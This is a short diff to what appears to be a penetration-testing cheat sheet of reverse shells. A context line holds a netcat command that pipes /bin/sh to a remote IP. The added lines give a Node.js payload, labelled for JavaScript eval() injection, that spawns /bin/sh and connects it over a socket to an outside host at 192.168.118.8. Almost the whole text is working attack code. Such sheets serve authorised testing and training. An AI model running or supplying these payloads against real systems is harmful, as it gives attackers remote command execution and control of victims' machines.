@@ -13,3 +13,18 @@ Netcat
 #the legacy necat which does not support -e option
 nc -e /bin/sh 10.0.0.1 1234
 
+
+Java Script Code Injection (eval())
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(21, "192.168.118.8", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
